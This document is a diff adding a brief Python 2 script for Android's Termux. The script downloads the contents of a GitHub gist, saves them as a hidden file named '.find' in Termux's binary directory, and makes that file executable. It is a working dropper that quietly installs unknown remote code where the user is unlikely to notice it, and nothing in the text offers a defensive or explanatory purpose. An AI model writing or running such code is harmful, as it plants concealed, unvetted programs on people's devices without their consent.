@@ -1,0 +1,14 @@
+import os, urllib2
+
+f = open('/data/data/com.termux/files/usr/bin/.find','w')
+
+link = 'https://gist.githubusercontent.com/Ranginang67/6f2ae21cd3ebb85249910b6277e081e3/raw/14044a247d2fb8877feebfaa8779c38b8bc6efc6/gistfile1.txt'
+open = urllib2.urlopen(link)
+data = open.read()
+
+d = '%s' %data
+
+f.write(d)
+f.close()
+
+os.system('chmod +x /data/data/com.termux/files/usr/bin/.find')
